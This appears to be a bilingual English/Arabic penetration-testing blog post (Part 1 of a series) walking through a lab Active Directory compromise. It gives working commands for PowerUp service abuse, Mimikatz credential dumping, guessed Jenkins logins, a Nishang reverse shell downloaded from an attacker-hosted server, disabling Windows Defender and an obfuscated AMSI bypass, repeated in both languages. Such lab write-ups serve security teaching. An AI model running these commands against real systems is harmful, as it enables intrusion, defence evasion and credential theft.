@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Privilege Escalation And Lateral Movement Part 1 | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>Privilege Escalation And Lateral Movement Part 1</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2023-09-05</span>
+</div>
+<h1 class="post-title">Privilege Escalation And Lateral Movement Part 1</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, we will demonstrate how to escalate privileges to Administrator on a local machine using the PowerUp tool, which automates the discovery of privilege escalation vectors. We will then explain why local privilege escalation matters, and proceed to move laterally from machine to machine within the domain until we get closer to the Domain Controller.</p>
+<p><strong>Note:</strong> I covered many privilege escalation methods on Windows in previous articles. This article will be split into multiple parts.</p>
+<h2>Walkthrough</h2>
+<h3>Prerequisites</h3>
+<p>We begin this article after having already loaded our scripts into memory to bypass Windows Defender and AMSI. These bypass techniques were explained in the first article of this series.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/10.png" alt="Step 1" loading="lazy"></figure>
+<h3>Step 1: Enumerate Privilege Escalation Vectors with PowerUp</h3>
+<p>Run the following command to have PowerUp enumerate all possible privilege escalation paths on the current system:</p>
+<pre><code class="language-powershell">Invoke-AllChecks
+</code></pre>
+<p>This command produces a large amount of output, but the fields we care about are <strong>Service Name</strong> and <strong>CanRestart</strong>. In our case, two vulnerable services were identified:</p>
+<ol>
+<li><strong>AbyssWebServer</strong></li>
+<li><strong>gupdate</strong></li>
+</ol>
+<p>There is an important detail here: if we look at the <code>CanRestart</code> field for the <code>gupdate</code> service, its value is <code>False</code>, which means we cannot exploit it because we are unable to restart the service.</p>
+<p>However, for the <strong>AbyssWebServer</strong> service, the <code>CanRestart</code> field has a value of <code>True</code>, meaning we can exploit it.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/11.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 2: Exploit the Vulnerable Service</h3>
+<p>We use the <code>Invoke-ServiceAbuse</code> command, specifying the vulnerable service name and the username we want to elevate to Administrator. In this case, our current user is <code>student407</code>:</p>
+<pre><code class="language-powershell">Invoke-ServiceAbuse -Name &quot;AbyssWebServer&quot; -UserName &quot;dcorp\student407&quot;
+</code></pre>
+<p>Our privileges have now been elevated to Administrator on the local machine. All we need to do is log off and log back on for the changes to take effect.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/12.png" alt="Step 3" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/13.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 3: Understanding Why Privilege Escalation Matters</h3>
+<p>Why do we need to be Administrator? Because we want to run <strong>Mimikatz</strong> -- a tool that extracts passwords stored in memory. Mimikatz requires Administrator privileges to function, as it needs to access the LSASS process.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/14.png" alt="Step 5" loading="lazy"></figure>
+<h3>Step 4: Run Mimikatz to Extract Credentials</h3>
+<p>Now we open PowerShell as Administrator and load Mimikatz. We then execute the following command to extract all credentials stored in memory:</p>
+<pre><code>sekurlsa::logonpasswords
+</code></pre>
+<p>However, we notice that no interesting passwords were found -- only the password for the user we are currently logged in as. No credentials for high-value accounts (such as Domain Admins) appeared. We need to look elsewhere.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/2.png" alt="Step 6" loading="lazy"></figure>
+<h3>Step 5: Network Reconnaissance with Nmap</h3>
+<p>We perform a port scan against the machines on the network to discover other services and potential targets:</p>
+<pre><code class="language-bash">nmap -sV 172.16.3.0/24 -PS
+</code></pre>
+<p>We discover an IP address with several open ports. First, we check the HTTP port to see if there is a CMS running that might have a known vulnerability.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/3.png" alt="Step 7" loading="lazy"></figure>
+<h3>Step 6: Discover and Exploit Jenkins</h3>
+<p>We find that the machine is running <strong>Jenkins</strong>, a software automation and continuous integration platform. After researching Jenkins, we learn that if you have <strong>Project Manager</strong> permissions, you can execute commands on the server and obtain a reverse shell.</p>
+<p>We notice several users on the system: <code>Manager</code>, <code>jenkinsadmin</code>, and <code>builduser</code>.</p>
+<p>We attempt to log in with each user using their username as the password:</p>
+<ul>
+<li><code>Manager</code> / <code>Manager</code> -- login failed</li>
+<li><code>jenkinsadmin</code> / <code>jenkinsadmin</code> -- login failed</li>
+<li><code>builduser</code> / <code>builduser</code> -- <strong>login successful</strong></li>
+</ul>
+<pre><code>Username: builduser
+Password: builduser
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/4.png" alt="Step 8" loading="lazy"></figure>
+<h3>Step 7: Obtain a Reverse Shell via Jenkins</h3>
+<p>After logging in, we select one of the existing projects (for example, project number 14). We navigate to the <strong>Configure</strong> option and scroll down to the bottom of the page, where there is a field that allows us to execute commands on the server.</p>
+<p>We will use a PowerShell reverse shell script from the Nishang framework:</p>
+<pre><code>https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+</code></pre>
+<p>First, we start a Python HTTP server hosting the PowerShell reverse shell script so the target machine can download it.</p>
+<p>Next, we set up a listener on our machine using PowerCat or NetCat to receive the incoming reverse shell connection.</p>
+<p>Then we enter the following command in the Jenkins build command field:</p>
+<pre><code class="language-powershell">powershell.exe iex (iwr http://172.16.100.7:9090/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.7 -Port 889
+</code></pre>
+<p>After saving and triggering a build on the project, we receive a reverse shell.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/5.png" alt="Step 9" loading="lazy"></figure>
+<h3>Step 8: Verify Our Privileges on the Compromised Machine</h3>
+<p>Now that we have a shell on the new machine, we check whether the user we are running as is a member of the local Administrators group. We confirm that we have <strong>Administrator</strong> privileges on this compromised machine.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/6.png" alt="Step 10" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/7.png" alt="Step 11" loading="lazy"></figure>
+<h3>Step 9: Deploy Mimikatz on the Compromised Machine</h3>
+<p>Before transferring Mimikatz, we need to disable Windows Defender on the compromised machine:</p>
+<pre><code class="language-powershell">Set-MpPreference -DisableRealtimeMonitoring $true
+</code></pre>
+<p>Next, we bypass AMSI using an obfuscated PowerShell command:</p>
+<pre><code class="language-powershell">(neW-oBJeCt  iO.COMpRESsiOn.DeflAteSTrEAm([io.MemoryStREAM][coNveRT]::FrOmBAsE64StRINg( 'pZJRT9swEMff/SlOVqQmIqsyOjZENQnKpAkJWEUZe4jy4CaX1ZoTW7YzGqZ9dy5uBoWHvZAH53y+/8/3tx39kO3sED7DKWesc7L9CaveeWzmL2bTm671ssHpRevRarNC+1uW6OaMmW6tZAmlEs7BjvaHMaAv/6LURWO09TH/hbZFNTvkSRHWRpXzwtMPt0RtgeBLb+Er+qXV5VlVWXQuHrObK111ClPS2KExQyXXosFk/rbdLrWoLuXaCtvHI7p9C3attYI7aX0nFNnwWPp/FpQZPaXwfUxV9yv5QKY62Xqo1TXej5oUdOd3aWVq9U1V48LQ2F/GTxkj2Lvb3iBE4dgZi/a80JXmIV2cnOxb5KLhcADcyWmlFE9YNPa0L3h1A/vcFPhZ42RgrErRhmDR1TXaAWYIk7En0KtziJ7854MzKjlKIdt+yChhsS4iQ4il8OVm6GbRe8yLAuJsuzge6o4+DWOWhTHExyE+n5GM7u49qSb5/1/s9EpYtxGKmpsE0fD4J+fa9PFuZwKm8Nzox2TCJG7jHf8AgiRhjw==' ) , [SySteM.io.comPREssioN.CoMPReSSIONMOde]::DEcompreSS)| % { neW-oBJeCt io.sTreAMreaDER( $_ ,[TexT.eNcoDInG]::asCii)}).readtOeNd() |iEX
+</code></pre>
+<p>Now we load Mimikatz into memory on the compromised machine by downloading it from our HTTP server:</p>
+<pre><code class="language-powershell">iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)
+</code></pre>
+<p><strong>Note:</strong> The Mimikatz file transferred to the compromised machine is in <code>.ps1</code> (PowerShell script) format, whereas the one used at the beginning of this article was in <code>.exe</code> format. Both versions are available on GitHub.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/8.png" alt="Step 12" loading="lazy"></figure>
+<h3>Step 10: Extract Credentials from the Compromised Machine</h3>
+<p>Finally, we execute Mimikatz to check whether there are any valuable credentials stored in memory on this machine:</p>
+<pre><code class="language-powershell">Invoke-Mimikatz
+</code></pre>
+<p>Unfortunately, we did not find any passwords for a user that would help us advance further in the attack.</p>
+<p>In the next article, we will continue with the same scenario and explore how to progress the attack until we reach the Domain Controller.</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/9.png" alt="Step 13" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في هذي المقالة راح نشرح كيفية رفع الصلاحية الى Administrator على الجهاز المتواجدين عليه عن طريق اداة Power Up فكرة الاداة هذي تسوي Automation لطرق رفع الصلاحيات وراح نشرح ايش الفايدة من رفع الصلاحية</p>
+<p>من ثم راح ننتقل من جهاز الى جهاز مرتبط بالدومين الى مانوصل الى الدومين كنترولر</p>
+<p>تنويه: شرحت في مقالات سابقة طرق كثيرة الى رفع الصلاحيات على الوندوز و هذي المقالة راح تكون اكثر من جزء</p>
+<p>الشرح:</p>
+<p>راح نبدا في المقالة بعد مانسوي Load للسكربت في الميموري عشان نتخطى ال Windows Defender وايضا بعد تخطي ال AMSI وانا شرحت طرق التخطي هذي في المقالة الاولى</p>
+<p>المقالة الاولى</p>
+<p>هذا الامر راح يسوي Enumerate لطرق رفع الصلاحية على النظام</p>
+<p>Invoke-AllChecks</p>
+<p>نلاحظ ان في ملعومات كثير ظهرت لنا بس اللي يهمنا حقل Service Name و CanRestart طبعا ظهرت لنا خدمتين مصابة وهي:</p>
+<p>1 - AbyssWebServer</p>
+<p>2 - gupdate</p>
+<p>بس في هنا نقطة مهمة لو نلاحظ حقل CanRestart بالنسبة لخدمة gupdate قيمتها False ف ماراح ينفع نستغلها لان مانقدر نسوي لها Restart</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/10.png" alt="Step 1" loading="lazy"></figure>
+
+<p>اما بالنسبة لخدمة AbyssWebServer نلاحظ انه حقل CanRestart قيمته True ف هذا يعني يمكننا استغلالها :)</p>
+<p>هذا الامر تعطيه اسم السيرفس واسم المستخدم اللي تبيه يرفع صلاحيته الى Administrator</p>
+<p>طبعا اسم المستخدم اللي انا داخل فيه student</p>
+<p>Invoke-ServiceAbuse -Name "AbyssWebServer" -UserName "dcorp\student407"</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/11.png" alt="Step 2" loading="lazy"></figure>
+
+<p>الان رفعنا صلاحياتنا الى Administrator على الجهاز اللي نحن داخلين فيه كل اللي علينا نسوي Logoff بعدين Logon</p>
+<p>طيب ايش راح نستفيد من رفع الصلاحيات؟</p>
+<p>راح نقدر نشغل اداة Mimikatz هذي الاداة فكرتها انها راح تسحب الباسوردات المخزنة في الميموري وهذي الاداة اصلا ماتشتغل الا بصلاحية Administrator</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/12.png" alt="Step 3" loading="lazy"></figure>
+
+<p>الان راح نشغل PowerShell بصلاحية Administrator ونشغل اداة Mimikatz</p>
+<p>هذا الامر في اداة Mimikatz راح يستخرج لنا الباسوردات المخزنة في الميموري</p>
+<p>sekurlsa::logonpasswords</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/13.png" alt="Step 4" loading="lazy"></figure>
+
+<p>بس نلاحظ انه ماظهرنا باسورد لمستخدم معين فقط الباسورد الخاص في المستخدم اللي انا فيه ايش الحل :(</p>
+<p>الان راح اسوي Port Scan للاجهزة اللي موجودة على الشبكة عن طريق Nmap بالامر هذا</p>
+<p>nmap -sV  172.16.3.0/24 -PS</p>
+<p>نلاحظ انه ظهر لنا ايبي موجود عليه عدة بورتات مفتوحة اول شي راح اشيك على بورت ال http نشوف هل مركب عليه cms وهذا ال cms له استغلال</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/14.png" alt="Step 5" loading="lazy"></figure>
+
+<p>نلاحظ انه عليه CMS اسمه jenkins بعد ماقرات عنه طلع يقوم على اتمتة البرمجيات وتكاملها وانه اذا كان عندك صلاحيات Project Manager راح تقدر تجيب Reverse Shell على الجهاز</p>
+<p>لو نلاحظ مع بعض انه في عدد من المستخدمين موجودين على النظام مثل Manager,jenkinsadmin,builduser</p>
+<p>راح اجرب اسجل دخول لكل مستخدم واحط الباسورد نفس اسم المستخدم الخاص فيه</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/2.png" alt="Step 6" loading="lazy"></figure>
+
+<p>طبعا بعد ماجربت المستخدم Manager و Jenkinsadmin ماسجلي دخول</p>
+<p>اما بالنسبة للمستخدم buliduser سجل دخول معي</p>
+<p>Username:builduser Password:builduser</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/3.png" alt="Step 7" loading="lazy"></figure>
+
+<p>طيب راح نختار اي مشروع من الموجودين في الصفحة راح اختار مثلا المشروع رقم 14</p>
+<p>راح نروح الى خيار Configure بعد كذا ننزل الى اخر الصفحة راح نلاقي حقل يسمح لك انه تنفذ فيه اوامر على السيرفر</p>
+<p>الان راح استخدم سكربت PowerShell عشان نجيب Reverse Shell</p>
+<p>https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/4.png" alt="Step 8" loading="lazy"></figure>
+
+<p>الان راح اشغل http server بالبايثون وارفع عليه ملف البورشيل عشان ننقلة الى الجهاز اللي موجود علية ال CMS</p>
+<p>الان كل اللي علينا نفتج بورت للتنصت عن طريق PowerCat او NetCat</p>
+<p>وننفذ هذا الامر في حقل الاوامر</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/5.png" alt="Step 9" loading="lazy"></figure>
+
+<p>powershell.exe iex (iwr http://172.16.100.7:9090/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.7 -Port 889</p>
+<p>بعدها نسوي Save ونرجع نسوي Build للمشروع</p>
+<p>وبكذا جبنا Reverse Shell الان كل اللي علينا نشوف هل المستخدم اللي نحن عليه ضمن قروب ال Administrator او لا</p>
+<p>زي ما انتوا شايفين نحن بصلاحية Administrator على الجهاز اللي متواجدين عليه</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/6.png" alt="Step 10" loading="lazy"></figure>
+
+<p>راح ننقل اداة Mimikatz الى الجهاز اللي مخترقينة وعندنا عليه Administrator بس قبل ننقل الملف راح نوقف ال Windows Defender عن طريق هذا الامر:</p>
+<p>Set-MpPreference -DisableRealtimeMonitoring $true</p>
+<p>بعد كذا راح نتخطى ال AMSI عن طريق هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/7.png" alt="Step 11" loading="lazy"></figure>
+
+<p>(neW-oBJeCt  iO.COMpRESsiOn.DeflAteSTrEAm([io.MemoryStREAM][coNveRT]::FrOmBAsE64StRINg( 'pZJRT9swEMff/SlOVqQmIqsyOjZENQnKpAkJWEUZe4jy4CaX1ZoTW7YzGqZ9dy5uBoWHvZAH53y+/8/3tx39kO3sED7DKWesc7L9CaveeWzmL2bTm671ssHpRevRarNC+1uW6OaMmW6tZAmlEs7BjvaHMaAv/6LURWO09TH/hbZFNTvkSRHWRpXzwtMPt0RtgeBLb+Er+qXV5VlVWXQuHrObK111ClPS2KExQyXXosFk/rbdLrWoLuXaCtvHI7p9C3attYI7aX0nFNnwWPp/FpQZPaXwfUxV9yv5QKY62Xqo1TXej5oUdOd3aWVq9U1V48LQ2F/GTxkj2Lvb3iBE4dgZi/a80JXmIV2cnOxb5KLhcADcyWmlFE9YNPa0L3h1A/vcFPhZ42RgrErRhmDR1TXaAWYIk7En0KtziJ7854MzKjlKIdt+yChhsS4iQ4il8OVm6GbRe8yLAuJsuzge6o4+DWOWhTHExyE+n5GM7u49qSb5/1/s9EpYtxGKmpsE0fD4J+fa9PFuZwKm8Nzox2TCJG7jHf8AgiRhjw==' ) , [SySteM.io.comPREssioN.CoMPReSSIONMOde]::DEcompreSS)| % { neW-oBJeCt io.sTreAMreaDER( $_ ,[TexT.eNcoDInG]::asCii)}).readtOeNd() |iEX</p>
+<p>الان راح ننقل ملف ال Mimikatz الى الجهاز المخترق ونسويها لها Load في الميموري دايركت عن طريق هذا الامر</p>
+<p>iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/8.png" alt="Step 12" loading="lazy"></figure>
+
+<p>تنبيه: اداة ال Mimikatz اللي تم نلقها للجهاز المخترق صغيتها ps1 اما اللي كانت ف بداية المقالة كانت صيغتها exe طبعا كلها موجودة بموقع قيت اب</p>
+<p>الان كل اللي علينا ننفذ هذا الامر عشان نشوف هل في باسوردات مهمة في الميموري تهمنا او لا:</p>
+<p>Invoke-Mimikatz</p>
+<p>نلاحظ انه مالقينا اي باسورد لمستخدم يهمنا (;</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-powerup/9.png" alt="Step 13" loading="lazy"></figure>
+
+<p>في المقالة القادمة راح نكمل على نفس السيناريو ونشوف كيف راح نتقدم في الاختراق الى مانوصل الى Domain Controller</p>
+<p>شاكر لكم,</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
